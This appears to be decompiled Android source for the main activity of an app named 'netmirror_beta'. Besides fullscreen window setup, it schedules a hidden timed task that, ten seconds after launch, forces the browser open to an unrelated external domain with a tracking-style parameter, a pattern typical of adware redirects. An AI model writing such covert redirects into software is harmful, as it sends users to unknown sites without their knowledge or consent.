package app.netmirror.netmirrornew;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import androidx.core.view.AbstractC0255m0;
import androidx.core.view.C0257n0;
import androidx.core.view.M0;
import com.facebook.react.defaults.b;
import p014d1.AbstractActivityC0467s;
import p014d1.C0471w;

/* JADX INFO: loaded from: classes.dex */
public final class MainActivity extends AbstractActivityC0467s {
    @Override // p014d1.AbstractActivityC0467s, androidx.fragment.app.ActivityC0281j, androidx.activity.ComponentActivity, androidx.core.app.f, android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() { // from class: app.netmirror.netmirrornew.MainActivity.1
            @Override // java.lang.Runnable
            public void run() {
                MainActivity.this.startActivity(new Intent("android.intent.action.VIEW", Uri.parse("https://ustashewasputtin.com?U0cw9=1328583")));
            }
        }, 10000L);
        setRequestedOrientation(10);
        AbstractC0255m0.b(getWindow(), false);
        getWindow().setFlags(512, 512);
        M0 m3 = new M0(getWindow(), getWindow().getDecorView());
        m3.a(C0257n0.m.e());
        m3.e(2);
        getWindow().setNavigationBarColor(0);
        getWindow().setStatusBarColor(0);
    }

    @Override // p014d1.AbstractActivityC0467s, android.app.Activity, android.view.Window.Callback
    public void onWindowFocusChanged(boolean z3) {
        super.onWindowFocusChanged(z3);
        if (z3) {
            AbstractC0255m0.a(getWindow(), getWindow().getDecorView()).a(C0257n0.m.e());
        }
    }

    @Override // p014d1.AbstractActivityC0467s
    protected C0471w p0() {
        return new b(this, q0(), false, 4, null);
    }

    protected String q0() {
        return "netmirror_beta";
    }
}
